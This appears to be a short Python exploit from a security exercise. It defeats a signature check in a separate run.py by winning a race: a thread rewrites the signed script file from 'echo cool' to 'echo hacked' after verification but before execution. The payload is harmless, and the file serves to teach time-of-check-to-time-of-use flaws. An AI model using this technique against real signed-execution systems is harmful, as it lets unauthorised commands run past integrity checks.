import json
import threading
import time
import os

MY_SCRIPT_PATH = 'my_script.json'  # path of my script file
EXAMPLE_SIG = "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"
EXAMPLE_COMMAND = "echo cool"
MY_COMMAND = "echo hacked"


def generate_script(command):
    return json.dumps({'command': command, 'signature': EXAMPLE_SIG})


def write_script_to_file(command):
    script = generate_script(command)
    with open(MY_SCRIPT_PATH, 'w') as writer:
        writer.write(script)


def script_changer():
    time.sleep(4)  # let run.py run verify on the original hash and command of the example
    write_script_to_file(MY_COMMAND)  # then change the script file right before it is going to open it for executing the command


def main():
    threading.Thread(target=script_changer).start()  # start the thread, it will wait 4 seconds before changing the script giving the run.py time to open the file for the verify function.
    write_script_to_file(EXAMPLE_COMMAND)  # write original example json to script file
    os.system("python run.py " + MY_SCRIPT_PATH)  # execute on the original example script


if __name__ == "__main__":
    main()
